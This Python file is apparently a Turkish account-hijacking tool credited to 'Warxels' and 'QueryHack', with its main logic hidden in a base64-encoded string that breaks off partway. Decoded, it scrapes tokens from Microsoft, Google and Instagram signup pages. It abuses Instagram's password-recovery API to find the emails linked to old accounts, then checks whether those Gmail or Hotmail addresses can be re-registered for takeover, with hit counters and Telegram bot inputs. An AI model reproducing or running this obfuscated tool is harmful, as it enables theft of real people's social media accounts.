A = '.ninjapy'
import os, sys, base64 as B
C = 'I0J5OkBXYXJ4ZWxzICYgQ2hhbm5lbDogQFF1ZXJ5SGFjawppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQganNvbiwgc3RyaW5nCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKaW1wb3J0IG9zCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgKgpmcm9tIHJlcXVlc3RzIGltcG9ydCBwb3N0IGFzIHBwCmZyb20gdXNlcl9hZ2VudCBpbXBvcnQgZ2VuZXJhdGVfdXNlcl9hZ2VudCBhcyBnZ2IKZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZSBhcyBjYwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZHJhbmdlIGFzIHJyCmltcG9ydCByZQppbXBvcnQgaGFzaGxpYgppbXBvcnQgc3lzCmltcG9ydCB1dWlkCmltcG9ydCBkYXRldGltZQppbXBvcnQgdGltZQppbXBvcnQgd2ViYnJvd3Nlcgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdCwgQmFjawppbml0KGF1dG9yZXNldD1UcnVlKQoKI0Fya2EgcGxhbiByZW5rbGVyaQpCUiA9IEJhY2suUkVEIApCRyA9IEJhY2suR1JFRU4KQkMgPSBCYWNrLkNZQU4KQlkgPSBCYWNrLllFTExPVwpCTSA9IEJhY2suTUFHRU5UQQpCQiA9IEJhY2suQkxVRQojUmVua2xlcgpHID0gRm9yZS5HUkVFTgpDID0gRm9yZS5DWUFOClkgPSBGb3JlLllFTExPVwpNID0gRm9yZS5NQUdFTlRBCkIgPSBGb3JlLkJMVUUKUiA9IEZvcmUuUkVEClggPSBGb3JlLlJFU0VUClEgPSBTdHlsZS5CUklHSFQgClogPSBTdHlsZS5SRVNFVF9BTEwKCgoKCnRyeToKICAgIGZyb20gY2ZvbnRzIGltcG9ydCByZW5kZXIsIHNheQpleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHB5dGhvbi1jZm9udHMnKQogICAgZXhpdChwcmludCgnVG9vbHUgeWVuaWRlbiBiYcWfbGF0IScpKQpmb3IgeHh4IGluICJCdSBUb29sIFNhZGVjZSAyMDEyIEhlc2FwbGFyxLEgRMO8xZ/DvHLDvHIhIFZwbiBBw6dtYW4gR2VyZWtpcixcbkjEsXrEsSDDh29rIMSweWlkaXIsIMSweWkgS3VsbGFuxLFtbGFyISB+IEBXYXJ4ZWxzIjoKCXByaW50KFErRyt4eHgsIGVuZD0iIiwgZmx1c2g9VHJ1ZSkKCXRpbWUuc2xlZXAoMC4wNSkKdGltZS5zbGVlcCgzKQpvcy5zeXN0ZW0oJ2NsZWFyJykKbG9nbzIgPSByZW5kZXIoJzIwMTInLCBjb2xvcnM9WydtYWdlbnRhJywgJ3doaXRlJ10sIGFsaWduPSdjZW50ZXInKQpsb2dvID0gcmVuZGVyKCcyMDEyJywgY29sb3JzPVsnbWFnZW50YScsICd3aGl0ZSddLCBhbGlnbj0nY2VudGVyJykKcHJpbnQoIl8iICo2MCkKCnByaW50KGxvZ28pCnByaW50KCIgIiAqMjAgKyBCUisiIEBXYXJ4ZWxzIH4gQFF1ZXJ5VG9vbCAiKQpwcmludCgiXyIgKjYwKQp0b2sgPSBpbnB1dCgnVG9rZW4gR2lyIDogJykKaWRkID1pbnB1dCgnxLBkIEdpciA6ICcpCm9zLnN5c3RlbSgnY2xlYXInKQpyZWQgPSAiXDAzM1sxbVwwMzNbMzFtIgpncmVlbiA9ICJcMDMzWzFtXDAzM1szMm0iCnllbGxvdyA9ICJcMDMzWzFtXDAzM1szM20iCmJsdWUgPSAiXDAzM1sxbVwwMzNbMzRtIgpjeWFuID0gIlwwMzNbMW1cMDMzWzM2bSIKbWFnZW50YSA9ICJcMDMzWzFtXDAzM1szNW0iCk0gPSAiXDAzM1sxbVwwMzNbMzZtIgp3aGl0ZSA9ICJcMDMzWzFtXDAzM1szN20iCm9yYW5nZSA9ICJcMDMzWzFtXDAzM1szODs1OzIwOG0iCnJlc2V0ID0gIlwwMzNbMG0iCmFjYSA9IDAKaGl0cyA9IDAKYmFkaW5zdGEgPSAwCmJhZGVtYWlsID0gMApnb29kaWcgPSAwCmRlZiBhbWlyKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIG91dHB1dCA9IChmIiIiCntncmVlbn1IxLBUIDoge3doaXRlfXtoaXRzfSB7cmVkfUvDtnTDvCDEsG5zdGE6IHt3aGl0ZX17YmFkaW5zdGF9IHt5ZWxsb3d9S8O2dMO8IE1haWw6IHt3aGl0ZX0ge2JhZGVtYWlsfSB7b3JhbmdlfcSweWkgxLBuc3RhOiB7d2hpdGV9e2dvb2RpZ30ge2N5YW59Clxue2N5YW59QFdhcnhlbHMgfiBAUXVlcnlUb29sIiIiKQogICAgc3lzLnN0ZG91dC53cml0ZShvdXRwdXQpCiAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKCmN5YW4gPSAnXDAzM1s5Nm0nIApyZXNldCA9ICdcMDMzWzBtJyAKCiMgU2FkZWNlIDIwMTIgecSxbMSxbmEgYWl0IHZlcmlsZXJpIGt1bGxhbgpiYmsgPSAyMDQ3NDYzNzQgICMgMjAxMiBiYcWfbGFuZ8Sxw6cgSUQnc2kKaWQgPSAyNzk3NjAwMDAgICAjIDIwMTIgYml0acWfIElEJ3NpCgp3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICAgIHJlcyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9zaWdudXAubGl2ZS5jb20vc2lnbnVwJykKICAgICAgICBhbXNjID0gcmVzLmNvb2tpZXMuZ2V0X2RpY3QoKS5nZXQoJ2Ftc2MnKQogICAgICAgIGNhbmFyeSA9IHJlcy50ZXh0LnNwbGl0KCciYXBpQ2FuYXJ5IjoiJylbMV0uc3BsaXQoJyInKVswXS5lbmNvZGUoKS5kZWNvZGUoJ3VuaWNvZGVfZXNjYXBlJykKICAgICAgICBjb29raWVzID0gewogICAgICAgICAgICAnYW1zYyc6IGFtc2MsCiAgICAgICAgfQogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICdhdXRob3JpdHknOiAnc2lnbnVwLmxpdmUuY29tJywKICAgICAgICAgICAgJ2FjY2VwdCc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAgICAgJ2NhbmFyeSc6IGNhbmFyeSwKICAgICAgICAgICAgJ29yaWdpbic6ICdodHRwczovL3NpZ251cC5saXZlLmNvbScsCiAgICAgICAgICAgICdyZWZlcmVyJzogJ2h0dHBzOi8vc2lnbnVwLmxpdmUuY29tL3NpZ251cD9saWM9MSZ1YWlkPWYyNmQxZTg3MjY5NDRlM2Y5Y2M5NmFhZmRmZGY4MjI1JywKICAgICAgICAgICAgJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICAgICB9CgogICAgICAgIGpzb25fZGF0YSA9IHsKICAgICAgICAgICAgJ2NsaWVudEV4cGVyaW1lbnRzJzogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICdwYXJhbGxheCc6ICdlbmFibGVqc3B1YmxpY2tleWRlcHJlY2F0aW9uZXhwZXJpbWVudCcsCiAgICAgICAgICAgICAgICAgICAgJ2NvbnRyb2wnOiAnZW5hYmxlanNwdWJsaWNrZXlkZXByZWNhdGlvbmV4cGVyaW1lbnRfY29udHJvbCcsCiAgICAgICAgICAgICAgICAgICAgJ3RyZWF0bWVudHMnOiBbCiAgICAgICAgICAgICAgICAgICAgICAgICdlbmFibGVqc3B1YmxpY2tleWRlcHJlY2F0aW9uZXhwZXJpbWVudF90cmVhdG1lbnQnLAogICAgICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICBdLAogICAgICAgIH0KCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KAogICAgICAgICAgICAnaHR0cHM6Ly9zaWdudXAubGl2ZS5jb20vQVBJL0V2YWx1YXRlRXhwZXJpbWVudEFzc2lnbm1lbnRzJywKICAgICAgICAgICAgY29va2llcz1jb29raWVzLAogICAgICAgICAgICBoZWFkZXJzPWhlYWRlcnMsCiAgICAgICAgICAgIGpzb249anNvbl9kYXRhLAogICAgICAgICkuanNvbigpCiAgICAgICAgY2FuYXJ5ID0gcmVzcG9uc2VbJ2FwaUNhbmFyeSddCiAgICAgICAgYnJlYWsKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgp3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICAgIGEgPSAiaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9hY2NvdW50cy9sb2dpbiIKICAgICAgICBzZXNzaW9uID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgYWEgPSBzZXNzaW9uLmdldChhKQogICAgICAgIGNzcmYgPSBhYS5jb29raWVzLmdldCgnY3NyZnRva2VuJykKICAgICAgICBicmVhawogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCnl5ID0gJ2F6ZXJ0eXVpb3BtbGtqaGdmZHNxd3hjdmJuJwpkZWYgdGxsKCk6CiAgICB0cnk6CiAgICAgICAgbjEgPSAnJy5qb2luKGNjKHl5KSBmb3IgaSBpbiByYW5nZShycig2LCA5KSkpCiAgICAgICAgbjIgPSAnJy5qb2luKGNjKHl5KSBmb3IgaSBpbiByYW5nZShycigzLCA5KSkpCiAgICAgICAgaG9zdCA9ICcnLmpvaW4oY2MoeXkpIGZvciBpIGluIHJhbmdlKHJyKDE1LCAzMCkpKQogICAgICAgIGhlMyA9IHsKICAgICAgICAgICAgImFjY2VwdCI6ICIqLyoiLAogICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjogImFyLUlRLGFyO3E9MC45LGVuLUlRO3E9MC44LGVuO3E9MC43LGVuLVVTO3E9MC42IiwKICAgICAgICAgICAgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7Y2hhcnNldD1VVEYtOCIsCiAgICAgICAgICAgICJnb29nbGUtYWNjb3VudHMteHNyZiI6ICIxIiwKICAgICAgICAgICAgJ3VzZXItYWdlbnQnOiBzdHIoZ2diKCkpLAogICAgICAgIH0KICAgICAgICByZXMxID0gcmVxdWVzdHMuZ2V0KAogICAgICAgICAgICAnaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL3NpZ25pbi92Mi91c2VybmFtZXJlY292ZXJ5P2Zsb3dOYW1lPUdsaWZXZWJTaWduSW4mZmxvd0VudHJ5PVNlcnZpY2VMb2dpbiZobD1lbi1HQicsIAogICAgICAgICAgICBoZWFkZXJzPWhlMwogICAgICAgICkKICAgICAgICB0b2sgPSByZS5zZWFyY2gocidkYXRhLWluaXRpYWwtc2V0dXAtZGF0YT0iJS5ALm51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLCZxdW90OyguKj8pJnF1b3Q7LG51bGwsbnVsbCxudWxsLCZxdW90OyguKj8pJicsIHJlczEudGV4dCkuZ3JvdXAoMikKICAgICAgICBjb29raWVzID0gewogICAgICAgICAgICAnX19Ib3N0LUdBUFMnOiBob3N0CiAgICAgICAgfQogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICdhdXRob3JpdHknOiAnYWNjb3VudHMuZ29vZ2xlLmNvbScsCiAgICAgICAgICAgICdhY2NlcHQnOiAnKi8qJywKICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsCiAgICAgICAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkO2NoYXJzZXQ9VVRGLTgnLAogICAgICAgICAgICAnZ29vZ2xlLWFjY291bnRzLXhzcmYnOiAnMScsCiAgICAgICAgICAgICdvcmlnaW4nOiAnaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tJywKICAgICAgICAgICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL3NpZ251cC92Mi9jcmVhdGVhY2NvdW50P3NlcnZpY2U9bWFpbCY9aHR0cHMlM0ElMkYlMkZtYWlsLmdvb2dsZS5jb20lMkZtYWlsJTJGdSUyRjAlMkYmdGhlbWU9bW4nLAogICAgICAgICAgICAndXNlci1hZ2VudCc6IGdnYigpLAogICAgICAgIH0KICAgICAgICBkYXRhID0gewogICAgICAgICAgICAnZi5yZXEnOiBmJ1sie3Rva30iLCJ7bjF9Iiwie24yfSIsIntuMX0iLCJ7bjJ9IiwwLDAsbnVsbCxudWxsLCJ3ZWItZ2xpZi1zaWdudXAiLDAsbnVsbCwxLFtdLDFdJywKICAgICAgICAgICAgJ2RldmljZWluZm8nOiAnW251bGwsbnVsbCxudWxsLG51bGwsbnVsbCwiTkwiLG51bGwsbnVsbCxudWxsLCJHbGlmV2ViU2lnbkluIixudWxsLFtdLG51bGwsbnVsbCxudWxsLG51bGwsMixudWxsLDAsMSwiIixudWxsLG51bGwsMiwyXScsCiAgICAgICAgfQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCgKICAgICAgICAgICAgJ2h0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9fL3NpZ251cC92YWxpZGF0ZXBlcnNvbmFsZGV0YWlscycsCiAgICAgICAgICAgIGNvb2tpZXM9Y29va2llcywKICAgICAgICAgICAgaGVhZGVycz1oZWFkZXJzLAogICAgICAgICAgICBkYXRhPWRhdGEsCiAgICAgICAgKQogICAgICAgIHRsID0gc3RyKHJlc3BvbnNlLnRleHQpLnNwbGl0KCciLG51bGwsIicpWzFdLnNwbGl0KCciJylbMF0KICAgICAgICBob3N0ID0gcmVzcG9uc2UuY29va2llcy5nZXRfZGljdCgpWydfX0hvc3QtR0FQUyddCiAgICAgICAgd2l0aCBvcGVuKCd0bC50eHQnLCAndycpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZid7dGx9Ly97aG9zdH1cbicpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZSkKICAgICAgICB0bGwoKQp0bGwoKQoKZGVmIGNoZWNrX2dtYWlsKGVtYWlsKToKICAgIGdsb2JhbCBiYWRlbWFpbCwgaGl0cwogICAgdHJ5OgogICAgICAgIGlmICdAJyBpbiBlbWFpbDoKICAgICAgICAgICAgZW1haWwgPSBzdHIoZW1haWwpLnNwbGl0KCdAJylbMF0KCiAgICAgICAgdHJ5OgogICAgICAgICAgICBvID0gb3BlbigndGwudHh0JywgJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpWzBdCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBvID0gb3BlbigndGwudHh0JywgJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpWzBdCgogICAgICAgIHRsLCBob3N0ID0gby5zcGxpdCgnLy8nKQoKICAgICAgICBjb29raWVzID0gewogICAgICAgICAgICAnX19Ib3N0LUdBUFMnOiBob3N0CiAgICAgICAgfQogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICdhdXRob3JpdHknOiAnYWNjb3VudHMuZ29vZ2xlLmNvbScsCiAgICAgICAgICAgICdhY2NlcHQnOiAnKi8qJywKICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsCiAgICAgICAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkO2NoYXJzZXQ9VVRGLTgnLAogICAgICAgICAgICAnZ29vZ2xlLWFjY291bnRzLXhzcmYnOiAnMScsCiAgICAgICAgICAgICdvcmlnaW4nOiAnaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tJywKICAgICAgICAgICAgJ3JlZmVyZXInOiBmJ2h0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9zaWdudXAvdjIvY3JlYXRldXNlcm5hbWU/c2VydmljZT1tYWlsJj1odHRwcyUzQSUyRiUyRm1haWwuZ29vZ2xlLmNvbSUyRm1haWwlMkZ1JTJGMCUyRiZUTD17dGx9JywKICAgICAgICAgICAgJ3VzZXItYWdlbnQnOiBnZ2IoKSwKICAgICAgICB9CgogICAgICAgIHBhcmFtcyA9IHsnVEwnOiB0bH0KICAgICAgICBkYXRhID0gKAogICAgICAgICAgICAnPWh0dHBzJTNBJTJGJTJGbWFpbC5nb29nbGUuY29tJTJGbWFpbCUyRnUlMkYwJTJGJmRkbT0wJmZsb3dFbnRyeT1TaWduVXAmc2VydmljZT1tYWlsJnRoZW1lPW1uJwogICAgICAgICAgICBmJyZmLnJlcT0lNUIlMjJUTCUzQXt0bH0lMjIlMkMlMjJ7ZW1haWx9JTIyJTJDMCUyQzAlMkMxJTJDbnVsbCUyQzAlMkM1MTY3JTVEJmF6dD1BRm9hZ1VVdFJsdlY5MjhvUzlPN0Y2ZWVJNGRDTzJyMWlnJTNBMTcxMjMyMjQ2MDg4OCZjb29raWVzRGlzYWJsZWQ9ZmFsc2UmZGV2aWNlaW5mbz0lNUJudWxsJTJDbnVsbCUyQ251bGwlMkNudWxsJTJDbnVsbCUyQyUyMk5MJTIyJTJDbnVsbCUyQ251bGwlMkNudWxsJTJDJTIyR2xpZldlYlNpZ25JbiUyMiUyQ251bGwlMkMlNUIlNUQlMkNudWxsJTJDbnVsbCUyQ251bGwlMkNudWxsJTJDMiUyQ251bGwlMkMwJTJDMSUyQyUyMiUyMiUyQ251bGwlMkNudWxsJTJDMiUyQzIlNUQmZ21zY29yZXZlcnNpb249dW5kZWZpbmVkJmZsb3dOYW1lPUdsaWZXZWJTaWduSW4mJwogICAgICAgICkKICAgICAgICByZXNwb25zZSA9IHBwKAogICAgICAgICAgICAnaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL18vc2lnbnVwL3VzZXJuYW1lYXZhaWxhYmlsaXR5JywKICAgICAgICAgICAgcGFyYW1zPXBhcmFtcywKICAgICAgICAgICAgY29va2llcz1jb29raWVzLAogICAgICAgICAgICBoZWFkZXJzPWhlYWRlcnMsCiAgICAgICAgICAgIGRhdGE9ZGF0YSwKICAgICAgICApCiAgICAgICAgaWYgJyJnZi51YXIiLDEnIGluIHN0cihyZXNwb25zZS50ZXh0KToKICAgICAgICAgICAgaGl0cyArPSAxCiAgICAgICAgICAgIGFtaXIoKQogICAgICAgICAgICBpZiAnQCcgbm90IGluIGVtYWlsOgogICAgICAgICAgICAgICAgb2sgPSBlbWFpbCArICdAZ21haWwuY29tJwogICAgICAgICAgICAgICAgdXNlcm5hbWUsIGdnID0gb2suc3BsaXQoJ0AnKQogICAgICAgICAgICAgICAgSW5mb0FjYyh1c2VybmFtZSwgZ2cpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB1c2VybmFtZSwgZ2cgPSBlbWFpbC5zcGxpdCgnQCcpCiAgICAgICAgICAgICAgICBJbmZvQWNjKHVzZXJuYW1lLCBnZykKICAgICAgICBlbHNlOiAKICAgICAgICAgIGJhZGVtYWlsKz0xCiAgICAgICAgICBhbWlyKCkKICAgIGV4Y2VwdDonJwoKZGVmIGhvdG1haWwoZW1haWwpOgogICAgZ2xvYmFsIGhpdHMsIGJhZGVtYWlsCiAgICBjb29raWVzID0gewogICAgICAgICdhbXNjJzogYW1zYywKICAgIH0KCiAgICBoZWFkZXJzID0gewogICAgICAgICdjYW5hcnknOiBjYW5hcnksCiAgICAgICAgJ29yaWdpbic6ICdodHRwczovL3NpZ251cC5saXZlLmNvbScsCiAgICAgICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly9zaWdudXAubGl2ZS5jb20vc2lnbnVwP2xpYz0xJnVhaWQ9M2RhYWY1YmY2YjcwNDk5ZDhhNTAzNTg0NGQ1YmJmZDgnLAogICAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgSykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNC4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgICB9CgogICAganNvbl9kYXRhID0gewogICAgICAgICdzaWduSW5OYW1lJzogZW1haWwsCiAgICB9CgogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KAogICAgICAgICdodHRwczovL3NpZ251cC5saXZlLmNvbS9BUEkvQ2hlY2tBdmFpbGFibGVTaWduaW5OYW1lcycsCiAgICAgICAgY29va2llcz1jb29raWVzLAogICAgICAgIGhlYWRlcnM9aGVhZGVycywKICAgICAgICBqc29uPWpzb25fZGF0YSwKICAgICkudGV4dAogICAgCiAgICBpZiAnImlzQXZhaWxhYmxlIjp0cnVlJyBpbiByZXNwb25zZToKICAgICAgICBoaXRzICs9IDEKICAgICAgICBhbWlyKCkKICAgICAgICB1c2VybmFtZSwgZ2cgPSBlbWFpbC5zcGxpdCgnQCcpCiAgICAgICAgSW5mb0FjYyh1c2VybmFtZSwgZ2cpCiAgICBlbHNlOgogICAgICAgIGJhZGVtYWlsICs9IDEKICAgICAgICBhbWlyKCkKICAgICAgICAKZGVmIGNoZWNrKGVtYWlsKToKICAgIGdsb2JhbCBnb29kaWcsIGJhZGluc3RhCiAgICB1YSA9IGdlbmVyYXRlX3VzZXJfYWdlbnQoKQogICAgZGV2ID0gJ2FuZHJvaWQtJwogICAgZGV2aWNlX2lkID0gZGV2ICsgaGFzaGxpYi5tZDUoc3RyKHV1aWQudXVpZDQoKSkuZW5jb2RlKCkpLmhleGRpZ2VzdCgpWzoxNl0KICAgIHV1aSA9IHN0cih1dWlkLnV1aWQ0KCkpCiAgICBoZWFkZXJzID0gewogICAgICAgICdVc2VyLUFnZW50JzogdWEsCiAgICAgICAgJ0Nvb2tpZSc6ICdtaWQ9WlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUDsgY3NyZnRva2VuPTl5M041a0xxemlhbFFBN3o5NkFNaXlBS0xNQldwcVZqJywKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOCcsCiAgICB9CiAgICBkYXRhID0gewogICAgICAgICdzaWduZWRfYm9keSc6ICcwZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MDIwMTJmYjBhMzI5YmNhZmIzYjFmNGMwYmI1NmIxZjFmLicgKyBqc29uLmR1bXBzKHsKICAgICAgICAgICAgJ19jc3JmdG9rZW4nOiAnOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmonLAogICAgICAgICAgICAnYWRpZCc6IHV1aSwKICAgICAgICAgICAgJ2d1aWQnOiB1dWksCiAgICAgICAgICAgICdkZXZpY2VfaWQnOiBkZXZpY2VfaWQsCiAgICAgICAgICAgICdxdWVyeSc6IGVtYWlsCiAgICAgICAgfSksCiAgICAgICAgJ2lnX3NpZ19rZXlfdmVyc2lvbic6ICc0JywKICAgIH0KICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL2FjY291bnRzL3NlbmRfcmVjb3ZlcnlfZmxvd19lbWFpbC8nLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSkudGV4dAogICAgaWYgZW1haWwgaW4gcmVzcG9uc2U6CiAgICAgICAgaWYgJ0BnbWFpbC5jb20nIGluIGVtYWlsOgogICAgICAgICAgICBjaGVja19nbWFpbChlbWFpbCkKICAgICAgICBnb29kaWcgKz0gMQogICAgICAgIGFtaXIoKQogICAgZWxzZToKICAgICAgICBiYWRpbnN0YSArPSAxCiAgICAgICAgYW1pcigpCgpkZWYgcmVzdCh1c2VyKToKICB0cnk6CiAgICBoZWFkZXJzID0gewogICAgJ1gtUGlnZW9uLVNlc3Npb24tSWQnOiAnNTBjYzY4NjEtNzAzNi00M2I0LTgwMmUtZmI0MjgyNzk5YzYwJywKICAgICdYLVBpZ2Vvbi1SYXdjbGllbnR0aW1lJzogJzE3MDAyNTE1NzQuOTgyJywKICAgICdYLUlHLUNvbm5lY3Rpb24tU3BlZWQnOiAnLTFrYnBzJywKICAgICdYLUlHLUJhbmR3aWR0aC1TcGVlZC1LQlBTJzogJy0xLjAwMCcsCiAgICAnWC1JRy1CYW5kd2lkdGgtVG90YWxCeXRlcy1CJzogJzAnLAogICAgJ1gtSUctQmFuZHdpZHRoLVRvdGFsVGltZS1NUyc6ICcwJywKICAgICdYLUJsb2tzLVZlcnNpb24tSWQnOiAnYzgwYzVmYjMwZGZhZTllMjczZTQwMDlmMDNiMTgyODBiYjM0M2IwODYyZDY2M2YzMWEzYzYzZjEzYTlmMzFjMCcsCiAgICAnWC1JRy1Db25uZWN0aW9uLVR5cGUnOiAnV0lGSScsCiAgICAnWC1JRy1DYXBhYmlsaXRpZXMnOiAnM2JyVHZ3PT0nLAogICAgJ1gtSUctQXBwLUlEJzogJzU2NzA2NzM0MzM1MjQyNycsCiAgICAnVXNlci1BZ2VudCc6ICdJbnN0YWdyYW0gMTAwLjAuMC4xNy4xMjkgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgMTA4MHgyMTI5OyBzYW1zdW5nOyBTTS1NMjA1RjsgbTIwbHRlOyBleHlub3M3OTA0OyBlbl9HQjsgMTYxNDc4NjY0KScsCiAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLUdCLCBlbi1VUycsCiAgICAgJ0Nvb2tpZSc6ICdtaWQ9WlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUDsgY3NyZnRva2VuPTl5M041a0xxemlhbFFBN3o5NkFNaXlBS0xNQldwcVZqJywKICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04JywKICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsCiAgICAnSG9zdCc6ICdpLmluc3RhZ3JhbS5jb20nLAogICAgJ1gtRkItSFRUUC1FbmdpbmUnOiAnTGlnZXInLAogICAgJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCiAgICAnQ29udGVudC1MZW5ndGgnOiAnMzU2JywKfQogICAgZGF0YSA9IHsKICAgICdzaWduZWRfYm9keSc6ICcwZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MDIwMTJmYjBhMzI5YmNhZmIzYjFmNGMwYmI1NmIxZjFmLnsiX2NzcmZ0b2tlbiI6Ijl5M041a0xxemlhbFFBN3o5NkFNaXlBS0xNQldwcVZqIiwiYWRpZCI6IjBkZmFmODIwLTI3NDgtNDYzNC05MzY1LWMzZDhjODAxMTI1NiIsImd1aWQiOiIxZjc4NDQzMS0yNjYzLTRkYjktYjYyNC04NmJkOWNlMWQwODQiLCJkZXZpY2VfaWQiOiJhbmRyb2lkLWI5M2RkYjM3ZTk4MzQ4MWMiLCJxdWVyeSI6IicrdXNlcisnIn0nLAogICAgJ2lnX3NpZ19rZXlfdmVyc2lvbic6ICc0JywKICB9CiAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vaS5pbnN0YWdyYW0uY29tL2FwaS92MS9hY2NvdW50cy9zZW5kX3JlY292ZXJ5X2Zsb3dfZW1haWwvJyxoZWFkZXJzPWhlYWRlcnMsZGF0YT1kYXRhLCkuanNvbigpCiAgICByPXJlc3BvbnNlWydlbWFpbCddCiAgZXhjZXB0OgogICAgcj0ncmVzZXQgYnVsdW5hbWFkaSAnCiAgcmV0dXJuIHIKCmRlZiBkYXRlKGh5KToKICAgIHRyeToKICAgICAgICByYW5nZXMgPSBbCiAgICAgICAgICAgICgxMjc5MDAwLCAyMDEwKSwKICAgICAgICAgICAgKDE3NzUwMDAwLCAyMDExKSwKICAgICAgICAgICAgKDI3OTc2MDAwMCwgMjAxMiksCiAgICAgICAgICAgICg5MDA5OTAwMDAsIDIwMTMpLAogICAgICAgICAgICAoMTYyOTAxMDAwMCwgMjAxNCksCiAgICAgICAgICAgICgyNTAwMDAwMDAwLCAyMDE1KSwKICAgICAgICAgICAgKDM3MTM2Njg3ODYsIDIwMTYpLAogICAgICAgICAgICAoNTY5OTc4NTIxNywgMjAxNyksCiAgICAgICAgICAgICg4NTk3OTM5MjQ1LCAyMDE4KSwKICAgICAgICAgICAgKDIxMjU0MDI5ODM0LCAyMDE5KQogICAgICAgIF0KICAgICAgICAKICAgICAgICBmb3IgdXBwZXIsIHllYXIgaW4gcmFuZ2VzOgogICAgICAgICAgICBpZiBoeSA8PSB1cHBlcjoKICAgICAgICAgICAgICAgIHJldHVybiB5ZWFyCiAgICAgICAgcmV0dXJuIDIwMjMKICAgIAogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwYXNzCgogICAgCmRlZiBJbmZvQWNjKHVzZXJuYW1lLCBnZyk6CiAgICBnbG9iYWwgYWNhCiAgICBoZWFkZXJzID0gewogICAgIC